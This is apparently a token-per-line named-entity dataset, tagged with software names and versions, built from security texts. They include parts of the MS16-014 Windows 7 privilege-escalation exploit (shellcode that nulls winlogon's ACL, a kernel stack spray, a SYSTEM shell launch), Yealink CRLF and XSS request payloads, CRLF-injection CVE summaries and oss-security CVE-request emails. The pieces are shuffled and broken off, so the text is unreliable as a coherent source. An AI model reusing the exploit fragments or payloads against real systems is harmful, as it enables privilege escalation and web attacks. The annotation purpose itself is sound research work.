004 O
DWORD O
cSpins O
; O
008 O
DWORD O
dwExpWinVer O
; O

Vendor O
Homepage O
: O
Version O
: O
Windows O
7 O
SP1 O
x86 O

Check O
this O
mov O
eax O
, O
[ O
eax O
+ O
8 O
] O
THREADINFO O
mov O
eax O
, O
[ O
eax O
] O
ETHREAD O
mov O
eax O
, O
[ O
eax O
+ O
0x150 O
] O
KPROCESS O
mov O
eax O
, O
[ O
eax O
+ O
0xb8 O
] O
flink O
procloop O
: O
lea O
edx O
, O
[ O
eax O
- O
0xb8 O
] O
KPROCESS O
mov O
eax O
, O
[ O
eax O
] O
add O
edx O
, O
0x16c O
module O
name O
cmp O
dword O
ptr O
[ O
edx O
] O
, O
0x6c6e6977 O
xef O
xbf O
xbdwinl O
xef O
xbf O
xbd O
for O
winlogon.exe O
jne O
procloop O
sub O
edx O
, O
0x170 O
mov O
dword O
ptr O
[ O
edx O
] O
, O
0x0 O
NULL O
ACL O
ret O
} O
} O
int O
main O
( O
) O
{ O
DWORD O
dwBytesReturned O
; O
HANDLE O
threadhandle O
; O
WMIRECEIVENOTIFICATION O
buffer O
; O
CHAR O
OutPut O
[ O
1000 O
] O
; O
if O
( O
! O
setup O
( O
) O
) O
{ O
printf O
( O
Could O
not O
setup O
window O
) O
; O
return O
0 O
; O
} O
PVOID O
userSC O
= O
VirtualAlloc O
( O
( O
VOID O
) O
0x2a000000 O
, O
0x1000 O
, O
MEM_COMMIT O
| O
MEM_RESERVE O
, O
PAGE_EXECUTE_READWRITE O
) O
; O
kHandle O
= O
( O
void O
) O
leakWndAddr O
( O
g_window O
) O
; O
memset O
( O
userSC O
, O
0x41 O
, O
0x1000 O
) O
; O
memcpy O
( O
userSC O
, O
Shellcode O
, O
0x40 O
) O
; O
if O
( O
! O
leakHal O
( O
) O
) O
{ O
printf O
( O
Could O
not O
leak O
Hal O
) O
; O
return O

Tested O
on O
: O
Windows SN
7 SV
SP1 SV
x86 O
CVE O
: O
2016-0400 O
MS16-014 O
EoP O
PoC O
created O
from O
CMD.exe O
with O
SYSTEM O
rights O
. O

WMIDataDevice O
, O
GENERIC_READ O
| O
GENERIC_WRITE O
, O
0 O
, O
NULL O
, O
OPEN_EXISTING O
, O
FILE_ATTRIBUTE_NORMAL O
, O
NULL O
) O
; O
if O
( O
hDriver O
! O
= O
INVALID_HANDLE_VALUE O
) O
{ O
SprayKernelStack O
( O
) O
; O
if O
( O
! O
DeviceIoControl O
( O
hDriver O
, O
IOCTL_WMI_RECEIVE_NOTIFICATIONS O
, O
& O
buffer O
, O
sizeof O
( O
buffer O
) O
, O
& O
OutPut O
, O
sizeof O
( O
OutPut O
) O
, O
& O
dwBytesReturned O
, O
NULL O
) O
) O
{ O
return O
1 O
NtQueryIntervalProfile O
NtQueryIntervalProfile O
= O
( O
_NtQueryIntervalProfile O
) O
GetProcAddress O
( O
GetModuleHandleA O
( O
NTDLL.DLL O
) O
, O
NtQueryIntervalProfile O
) O
; O
ULONG O
result O
; O
KPROFILE_SOURCE O
stProfile O
= O
ProfileTotalIssues O
; O
NtQueryIntervalProfile O
( O
stProfile O
, O
& O
result O
) O
; O
printf O
( O
SYSTEM O
shell O
comming O
) O
; O
Launch O
( O
) O
; O
printf O
( O
All O
done O
, O
exiting O
) O
; O
return O
0 O
; O
} O

Microsoft SN
Windows SN
7 SV
SP1 SV
( O
x86 O
) O
- O
Local O
Privilege O
Escalation O
( O
MS16-014 O
) O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
7.0 SV
before SV
7.0.0.43 SV
, O
8.0 SV
before SV
8.0.0.13 SV
, O
8.5 SV
Full SV
before SV
8.5.5.10 SV
, O
and SV
8.5 SV
Liberty SV
before SV
Liberty SV
Fix SV
Pack SV
16.0.0.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
Squid SN
before SV
3.1.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
header O
in O
a O
response O
. O

CRLF O
injection O
vulnerability O
in O
Cisco SN
TelePresence SN
TC SN
6.x SV
before SV
6.3.4 SV
and SV
7.x SV
before SV
7.3.3 SV
on O
Integrator O
C O
SX20 O
devices O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
, O
aka O
Bug O
ID O
CSCut79341 O
. O

CRLF O
injection O
vulnerability O
in O
IBM O
Flex O
System O
EN6131 O
40Gb O
Ethernet O
and O
IB6131 SN
40Gb SN
Infiniband SN
Switch SN
firmware O
before SV
3.4.1110 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
and O
resulting O
web O
cache O
poisoning O
or O
cross-site O
scripting O
( O
XSS O
) O
attacks O
, O
or O
obtain O
sensitive O
information O
via O
multiple O
unspecified O
parameters O
. O

CRLF O
injection O
vulnerability O
in O
libcurl SN
6.0 SV
through SV
7.x SV
before SV
7.40.0 SV
, O
when O
using O
an O
HTTP O
proxy O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
a O
URL O
. O

CRLF O
injection O
vulnerability O
in O
the O
Universal O
Access O
implementation O
in O
IBM SN
Curam SN
Social SN
Program SN
Management SN
6.0 SV
SP2 SV
before SV
EP26 SV
, O
6.0.4 SV
before SV
6.0.4.5 SV
iFix007 SV
, O
and SV
6.0.5 SV
before SV
6.0.5.5 SV
iFix003 SV
, O
when O
WebSphere O
Application O
Server O
is O
not O
used O
, O
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
an O
unspecified O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
Yealink SN
VoIP SN
Phones SN
with O
firmware O
28.72.0.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
model O
parameter O
to O
servlet O
. O

In O
my O
tests O
, O
I O
have O
used O
javascript O
, O
redirects O
, O
and O
even O
an O
entire O
web O
page O
shoved O
into O
the O
CRLF O
vulnerable O
inputs O
. O

The O
XSS O
vulnerability O
GET O
/servlet O
jumpto=dsskey O
& O
model= O
% O
22 O
% O
20onmouseover O
% O
3dprompt O
% O
28 O
1337 O
% O
29 O
% O
20badpuppy O
% O
3d O
% O
22 O
& O
p=login O
& O
q=loginForm O
HTTP/1.1 O
Typical O
Cross O
Site O
Scripting O
. O

ADVISORY O
CVE-2014-3427 O
CRLF O
Injection O
in O
Yealink O
VoIP O
Phones O
CVE-2014-3428 O
XSS O
vulnerabilities O
in O
Yealink O
VoIP O
Phones O
Date O
published O
: O
06/12/2014 O

Validated O
on O
Version O
28.72.0.2 SV
Hardware SN
Version O
28.2.0.128.0.0.0 SV
CRLF O
Injection O
( O
Header O
Splitting O
) O
proof O
of O
concept O
: O
Request O
GET O
/servlet O
linepage=1 O
& O
model= O
% O
0d O
% O
0a O
% O
20 O
ANYTHING O
I O
WANT O
GOES O
HERE O
& O
p=dsskey O
& O
q=load O
HTTP/1.1 O
In O
the O
above O
request O
, O
attackers O
can O
shove O
in O
code O
, O
webpages O
, O
etc O
. O

To O
minimize O
noise O
read O
more O
at O
: O
III O
. O

BACKGROUND O
Yealink O
is O
a O
manufacturer O
of O
VoIP O
and O
Video O
products O
. O

Vendor O
Contacted O
: O
05/08/2014 O
II O
. O

SOLUTION O
Minimize O
accessibility O
to O
the O
phone O
interface O
. O

Crickets O
06/12/2014 O
Advisory O
VI O
. O

TOOLS O
USED O
Burpsuite O
, O
WVS O
, O
Firefox O
J. O
Oquendo O
SGFA O
, O
SGFE O
, O
C|EH O
, O
CNDA O
, O
CHFI O
, O
OSCP O
, O
CPT O
, O
RWSP O
, O
GREM O
Where O
ignorance O
is O
our O
master O
, O
there O
is O
no O
possibility O
of O
real O
peace O
- O
Dalai O
Lama O
42B0 O
5A53 O
6505 O
6638 O
44BB O
3943 O
2BF7 O
D83F O
210A O
95AF O

V. O
VENDOR O
CONTACT O
AND O
RESPONSE O
05/08/2014 O
E-mailed O
security O
( O
at O
) O
yealink O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
( O
bounced O
) O
05/08/2014 O
Created O
an O
account O
on O
Yealink O
forum O
and O
sent O
message O
( O
no O
response O
for O
weeks O
) O
05/26/2014 O
Response O
via O
e-mail O
from O
Yealink O
05/26/2014 O
Replied O
to O
vendor O
I O
would O
disclose O
in O
June O
06/01/2014 O
Reached O
back O
out O
to O
vendor O
for O
update O
06/08/2014 O
Reached O
back O
out O
to O
vendor O
for O
update O
06/11/2014 O
Rouched O
out O
one O
last O
time O
... O

DESCRIPTION O
There O
are O
CRLF O
Injection O
and O
XSS O
vulnerabilities O
in O
Yealink O
VoIP O
telephones O
. O

CVE-2014-3427 O
CRLF O
Injection O
and O
CVE-2014-3428 O
XSS O
Injection O
in O
Yealink O
VoIP O
Phones O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
the O
Universal O
Access O
in O
IBM SN
Curam SN
Social SN
Program SN
Management SN
( O
SPM SN
) O
6.0.5.5 SV
, O
when O
WebSphere O
Application O
Server O
is O
not O
used O
, O
allow O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
parameters O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
IBM SN
Curam SN
Social SN
Program SN
Management SN
5.2 SV
SP1 SV
through SV
6.0.5.4 SV
allow O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
parameters O
to O
custom O
JSPs O
. O

CRLF O
injection O
vulnerability O
in O
FortiGuard SN
FortiWeb SN
before SV
5.0.3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
the O
Web O
Application O
Enterprise O
Console O
in O
IBM SN
InfoSphere SN
BigInsights SN
1.1 SV
and SV
2.x SV
before SV
2.1 SV
FP2 SV
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
Request SN
Tracker SN
( O
RT SN
) O
3.8.x SV
before SV
3.8.17 SV
and SV
4.0.x SV
before SV
4.0.13 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
MIME O
header O
. O

CRLF O
injection O
vulnerability O
in O
help/help_language.php O
in O
WebCollab SN
3.30 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
item O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
Jenkins SN
before SV
1.491 SV
, O
Jenkins SN
LTS SV
before SV
1.480.1 SV
, O
and O
Jenkins SN
Enterprise SV
1.424.x SV
before SV
1.424.6.13 SV
, O
1.447.x SV
before SV
1.447.4.1 SV
, O
and SV
1.466.x SV
before SV
1.466.10.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
ownCloud SN
Server SN
before SV
4.0.8 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
url O
path O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
Pebble SN
before SV
2.6.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
cryptographp.inc.php O
in O
Cryptographp O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
cfg O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
the O
tornado.web.RequestHandler.set_header O
function O
in O
Tornado SN
before SV
2.2.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
crafted O
input O
. O

) O
, O
by O
providing O
a O
specially-crafted O
input O
a O
remote O
attacker O
could O
use O
this O
flaw O
to O
perform O
cross-site O
scripting O
attacks O
, O
cross-user O
defacement O
, O
web O
cache O
poisoning O
etc O
. O

Upstream O
v2.2.1 O
release O
changelog O
: O
References O
: O
Could O
you O
allocate O
a O
CVE O
id O
for O
this O

Date O
: O
Fri O
, O
18 O
May O
2012 O
11:40:56 O
-0600 O
From O
: O
Kurt O
Seifried O
< O
kseifried O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
CC O
: O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
> O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O

If O
an O
application O
using O
the O
Tornado O
web O
framework O
accepted O
untrusted O
user O
input O
and O
based O
on O
that O
input O
updated O
the O
HTTP O
headers O
content O
( O
to O
redirect O
the O
user O
etc O
. O

- O
Kurt O
Seifried O
Red O
Hat O
Security O
Response O
Team O
( O
SRT O
) O
PGP O
: O
0x5E267993 O
A90B O
F995 O
7350 O
148F O
66BF O
7554 O
160D O
4553 O
5E26 O
7993 O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.12 O
( O
GNU/Linux O
) O

Comment O
: O
Using O
GnuPG O
with O
Mozilla O
- O
iQIcBAEBAgAGBQJPtomnAAoJEBYNRVNeJnmTt6QQAM5JUGGwQxV8LmGuKsFAUmN5 O
yfcDxNhY9b1a8lMFBfnNuFG9dSf+DbuAYgbe3hqPiFlj6fWMofIXcsUxPoUEuTLf O
5dkdypWOqun1BRLr72vyGxvO7KPoSijAvm8K2q7N3sPhB0D1bj914xhw1XCHorj5 O
zJ7/6krCefJY2bCGt90zqzjN/pAVXYYoi5i0czZAaiVDjcj87udgXVgzk3MjX7zh O
+UFxL5tJaWE9jZsXD61JkFhq/ZvKhfSjGbj1gmcNQxf7FFWoXoKLttHrb3gXHQxX O
BHEnUgs2zUzrm66Z4hLvztUMw5iJWawJh5s0UtIQaWagrSUY9QeTzeiDej5ppRfC O
h+41F8n0R1C94e598vCoOEQUXHBDrvJBRSws/ihJyojtOMjQ839X2zKDtcdM/+Nn O
9q/eL/qrGpCpPfZsKLrT/66glDcbW0ENUaB6EYvn5d3Wx38MkX+KTccqz9v9OKV5 O
arbFvYr+32AE7AHyxG8UKzSlN/3yz8QlO+6E3ajvAAbndlF+2LbOPtN8X2k0/pUI O
iPWI3yrtF84GMb9MUmfC3SEnHKZe/K3n3WPCFkyj2VpPv7IFwafCloc6ccUXRfpC O
MaLplHIotptFWgIYtHwqO3IqcM2Vp0XqsUv02Sfa9ghbt4rJVgEelNcXf7F5mU0W O
P75K9LZVPjfFbQSKMakn O
=7TSV O
END O
PGP O
SIGNATURE O

( O
should O
be O
CVE-2012- O
one O
) O
Thank O
you O
& O
& O
Regards O
, O
Jan. O
Jan O
iankko O
Lieskovsky O
Red O
Hat O
Security O
Response O
Team O
Please O
use O
CVE-2012-2374 O
for O
this O
issue O
. O

Subject O
: O
Re O
: O
CVE O
Request O
Tornado O
( O
python-tornado O
) O
: O
Tornado O
v2.2.1 O
tornado.web.RequestHandler.set_header O
( O
) O
fix O
to O
prevent O
header O
injection O

Subject O
: O
CVE O
Request O
Tornado O
( O
python-tornado O
) O
: O
Tornado O
v2.2.1 O
tornado.web.RequestHandler.set_header O
( O
) O
fix O
to O
prevent O
header O
injection O
Hello O
Kurt O
, O
Steve O
, O
vendors O
, O
Package O
: O
Tornado O
is O
an O
open O
source O
version O
of O
the O
scalable O
, O
non-blocking O
web O
server O
and O
tools O
that O
power O
FriendFeed O
: O
URL O
: O
Issue O
: O
A O
possibility O
of O
header O
injection O
response O
splitting O
flaw O
was O
found O
in O
the O
way O
web O
request O
handler O
of O
Tornado O
, O
a O
scalable O
, O
non-blocking O
web O
server O
and O
tools O
, O
performed O
sanitization O
of O
input O
arguments O
, O
provided O
to O
routine O
setting O
the O
HTTP O
response O
header O
name O
and O
value O
. O

( O
should O
be O
CVE-2012- O
one O
) O
Thank O
you O
& O
& O
Regards O
, O
Jan. O
Jan O
iankko O
Lieskovsky O
Red O
Hat O
Security O
Response O
Team O

Date O
: O
Fri O
, O
18 O
May O
2012 O
12:40:17 O
+0200 O
From O
: O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
To O
: O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
CC O
: O
oss-security O
@ O
... O
ts.openwall.com O

Subject O
: O
CVE O
Request O
Tornado O
( O
python-tornado O
) O
: O
Tornado O
v2.2.1 O
tornado.web.RequestHandler.set_header O
( O
) O
fix O
to O
prevent O
header O
injection O

CRLF O
injection O
vulnerability O
in O
the O
HMI O
web O
server O
in O
Siemens SN
WinCC SN
flexible SN
2004 SV
, O
2005 SV
, O
2007 SV
, O
and SV
2008 SV
before SV
SP3 SV
; O
WinCC SN
V11 SN
( O
aka SN
TIA SN
portal SN
) O
before SV
SP2 SV
Update SV
1 SV
; O
the O
TP O
, O
OP O
, O
MP O
, O
Comfort O
Panels O
, O
and O
Mobile O
Panels O
SIMATIC O
HMI O
panels O
; O
WinCC O
V11 O
Runtime O
Advanced O
; O
and O
WinCC O
flexible O
Runtime O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
autologin.jsp O
in O
Cisco SN
CiscoWorks SN
Common SN
Services SN
4.0 SV
, O
as O
used O
in O
Cisco O
Prime O
LAN O
Management O
Solution O
and O
other O
products O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
URL O
parameter O
, O
aka O
Bug O
ID O
CSCtu18693 O
. O

CRLF O
injection O
vulnerability O
in O
calendar/set.php O
in O
the O
Calendar O
in O
Moodle SN
1.9.x SV
before SV
1.9.15 SV
, O
2.0.x SV
before SV
2.0.6 SV
, O
2.1.x SV
before SV
2.1.3 SV
, O
and SV
2.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
vectors O
involving O
the O
url O
variable O
. O

CRLF O
injection O
vulnerability O
in O
actionpack/lib/action_controller/response.rb O
in O
Ruby SN
on SN
Rails SN
2.3.x SV
before SV
2.3.13 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
Content-Type O
header O
. O

Upstream O
had O
requested O
CVEs O
prior O
to O
disclosure O
, O
but O
didn O
t O
receive O
any O
. O

Date O
: O
Wed O
, O
17 O
Aug O
2011 O
10:52:47 O
-0600 O
From O
: O
Vincent O
Danen O
< O
vdanen O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
To O
: O
Michael O
Koziarski O
< O
michael O
@ O
... O
iarski.com O
> O
, O
aaron O
@ O
... O
derlovemaking.com O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O

1 O
) O
Filter O
Skipping O
bugs O
2 O
) O
SQL O
Injection O
issues O
3 O
) O
Parse O
error O
in O
strip_tags O
4 O
) O
UTF-8 O
escaping O
vulnerability O
Thanks O
! O

Vincent O
Danen O
Red O
Hat O
Security O
Response O
Team O

Subject O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O
Could O
we O
get O
CVEs O
assigned O
to O
these O
flaws O

Subject O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O

Subject O
: O
Re O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O
Original O
Message O
Could O
we O
get O
CVEs O
assigned O
to O
these O
flaws O

1 O
) O
Filter O
Skipping O
bugs O
Use O
CVE-2011-2929 O
2 O
) O
SQL O
Injection O
issues O
Use O
CVE-2011-2930 O
3 O
) O
Parse O
error O
in O
strip_tags O
Use O
CVE-2011-2931 O
4 O
) O
UTF-8 O
escaping O
vulnerability O
Use O
CVE-2011-2932 O
Thanks O
. O

Date O
: O
Fri O
, O
19 O
Aug O
2011 O
15:03:52 O
-0400 O
( O
EDT O
) O
From O
: O
Josh O
Bressers O
< O
bressers O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Michael O
Koziarski O
< O
michael O
@ O
... O
iarski.com O
> O
, O
aaron O
@ O
... O
derlovemaking.com O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O

Subject O
: O
Re O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O

Original O
Message O
Original O
Message O
Could O
we O
get O
CVEs O
assigned O
to O
these O
flaws O

Date O
: O
Sat O
, O
20 O
Aug O
2011 O
00:29:55 O
-0400 O
( O
EDT O
) O
From O
: O
Vincent O
Danen O
< O
vdanen O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Michael O
Koziarski O
< O
michael O
@ O
... O
iarski.com O
> O
, O
aaron O
@ O
... O
derlovemaking.com O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O

Sorry O
I O
missed O
this O
one O
earlier O
, O
I O
was O
looking O
at O
the O
3.x O
advisory O
page O
and O
missed O
this O
one O
. O

Subject O
: O
Re O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O
Sorry O
, O
there O
is O
one O
more O
flaw O
that O
needs O
a O
CVE O
assignment O
: O
Response O
splitting O
flaw O
in O
2.3.x SV
( O
3.0.0 O
and O
later O
not O
affected O
) O
. O

1 O
) O
Filter O
Skipping O
bugs O
Use O
CVE-2011-2929 O
2 O
) O
SQL O
Injection O
issues O
Use O
CVE-2011-2930 O
3 O
) O
Parse O
error O
in O
strip_tags O
Use O
CVE-2011-2931 O
4 O
) O
UTF-8 O
escaping O
vulnerability O
Use O
CVE-2011-2932 O
Vincent O
Danen O
Red O
Hat O
Security O
Response O
Team O

Subject O
: O
Re O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O
Original O
Message O

Use O
CVE-2011-3187 O
Thanks O
. O

Date O
: O
Mon O
, O
22 O
Aug O
2011 O
16:31:25 O
-0400 O
( O
EDT O
) O
From O
: O
Josh O
Bressers O
< O
bressers O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
coley O
< O
coley O
@ O
... O
re.org O

Hi O
, O
maybe O
this O
issue O
would O
qualify O
for O
a O
CVE O
too O
( O

) O
: O
This O
looks O
like O
it O
should O
also O
get O
one O
. O

Date O
: O
Mon O
, O
22 O
Aug O
2011 O
16:26:26 O
-0400 O
( O
EDT O
) O
From O
: O
Josh O
Bressers O
< O
bressers O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Michael O
Koziarski O
< O
michael O
@ O
... O
iarski.com O
> O
, O
aaron O
@ O
... O
derlovemaking.com O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O

Subject O
: O
Re O
: O
CVE O
request O
: O
ruby O
on O
rails O
flaws O
( O
4 O
) O
Original O
Message O
Sorry O
, O
there O
is O
one O
more O
flaw O
that O
needs O
a O
CVE O
assignment O
: O
Response O
splitting O
flaw O
in O
2.3.x SV
( O
3.0.0 O
and O
later O
not O
affected O
) O
. O

Use O
CVE-2011-3186 O
Thanks O
. O

On O
Friday O
19 O
August O
2011 O
21:03:52 O
Josh O
Bressers O
wrote O
: O
Original O
Message O
Could O
we O
get O
CVEs O
assigned O
to O
these O
flaws O

Upstream O
had O
requested O
CVEs O
prior O
to O
disclosure O
, O
but O
didn O
t O
receive O
any O
. O

5 O
, O
D-90409 O
Nuernberg O
, O
Germany O
Tel O
: O
+49-911-74053-0 O
; O
SUSE O
LINUX O
Products O
GmbH O
, O
GF O
: O
Jeff O
Hawn O
, O
HRB O
16746 O
( O
AG O
Nuernberg O
) O

) O
: O
Thanks O
in O
advance O
. O

Matthias O
Weckbecker O
, O
Junior O
Software O
Engineer O
, O
SUSE O
Security O
Team O
SUSE O
LINUX O
Products O
GmbH O
, O
Maxfeldstr O
. O

Date O
: O
Mon O
, O
22 O
Aug O
2011 O
10:24:32 O
+0200 O
From O
: O
Matthias O
Weckbecker O
< O
mweckbecker O
@ O
... O
e.de O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

1 O
) O
Filter O
Skipping O
bugs O
> O
3420ac71aed312d6 O
> O
a9552 O
Use O
CVE-2011-2929 O
2 O
) O
SQL O
Injection O
issues O
> O
6a1e473744bc389b O
> O
4bf85 O
Use O
CVE-2011-2930 O
3 O
) O
Parse O
error O
in O
strip_tags O
> O
2b9130749b74ea12 O
> O
8037a O
Use O
CVE-2011-2931 O
4 O
) O
UTF-8 O
escaping O
vulnerability O
> O
56bffb5923ab1195 O
> O
306bd O
Use O
CVE-2011-2932 O
Thanks O
. O

Mozilla SN
Firefox SN
before SV
3.6.23 SV
and SV
4.x SV
through SV
6 SV
, O
Thunderbird SN
before SV
7.0 SV
, O
and O
SeaMonkey SN
before SV
2.4 SV
do O
not O
properly O
handle O
HTTP O
responses O
that O
contain O
multiple O
Location O
, O
Content-Length O
, O
or O
Content-Disposition O
headers O
, O
which O
makes O
it O
easier O
for O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
via O
crafted O
header O
values O
. O

CRLF O
injection O
vulnerability O
in O
Microsoft SN
Forefront SN
Unified SN
Access SN
Gateway SN
( O
UAG SN
) O
2010 SV
Gold SV
, O
Update SV
1 SV
, O
Update SV
2 SV
, O
and SV
SP1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
, O
and O
conduct O
HTTP O
response O
splitting O
attacks O
and O
cross-site O
scripting O
( O
XSS O
) O
attacks O
, O
via O
unspecified O
vectors O
, O
aka O
ExcelTable O
Response O
Splitting O
XSS O
Vulnerability O
. O

CRLF O
injection O
vulnerability O
in O
chart.cgi O
in O
Bugzilla SN
before SV
3.2.10 SV
, O
3.4.x SV
before SV
3.4.10 SV
, O
3.6.x SV
before SV
3.6.4 SV
, O
and SV
4.0.x SV
before SV
4.0rc2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
query O
string O
, O
a O
different O
vulnerability O
than O
CVE-2010-2761 O
and O
CVE-2010-4411 O
. O

Unspecified O
vulnerability O
in O
CGI.pm SN
3.50 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unknown O
vectors O
. O

NOTE O
: O
this O
issue O
exists O
because O
of O
an O
incomplete O
fix O
for O
CVE-2010-2761 O
. O

Steve O
, O
could O
you O
please O
allocate O
CVE O
id O
for O
this O

Once O
CGI.pm O
has O
a O
final O
update O
to O
address O
the O
remaining O
header O
injection O
issue O
, O
I O
ll O
share O
the O
same O
patch O
with O
CGI O
: O
:Simple O
. O

A O
new O
patch O
has O
been O
developed O
, O
and O
is O
currently O
pending O
review O
and O
acceptance O
by O
the O
primary O
CGI.pm O
author O
, O
Lincoln O
Stein O
. O

Steve O
, O
could O
you O
please O
allocate O
one O

( O
id O
1 O
) O
CGI.pm O
is O
used O
by O
the O
Bugzilla O
code O
base O
. O

However O
, O
Bugzilla O
may O
not O
always O
be O
vulnerable O
to O
issues O
in O
CGI.pm O
depending O
on O
they O
use O
it O
. O

( O
Now O
CC O
ed O
) O
. O

Further O
improvements O
to O
handling O
of O
newlines O
embedded O
in O
header O
values O
. O

Is O
it O
related O
to O
CVE-2010-3172 O

However O
, O
later O
testing O
found O
that O
the O
issue O
wasn O
t O
completely O
fixed O
in O
3.50 SV
. O

Subject O
: O
Re O
: O
CVE O
Request O
perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O
Since O
perl-CGi O
is O
different O
code O
base O
than O
Bugzilla O
, O
we O
suspect O
a O
new O
CVE O
id O
is O
required O
for O
this O
issue O

Thanks O
to O
Michal O
Zalewski O
, O
Max O
Kanat-Alexander O
, O
Yanick O
Champoux O
Lincoln O
Stein O
, O
Frederic O
Buclin O
and O
Mark O
Stosberg O
Chris O
, O
Mark O
, O
could O
you O
please O
provide O
more O
details O
about O
the O
issue O

Yes O
, O
it O
is O
. O

An O
exception O
is O
thrown O
if O
header O
values O
contain O
invalid O
newlines O
. O

Subject O
: O
Re O
: O
CVE O
Request O
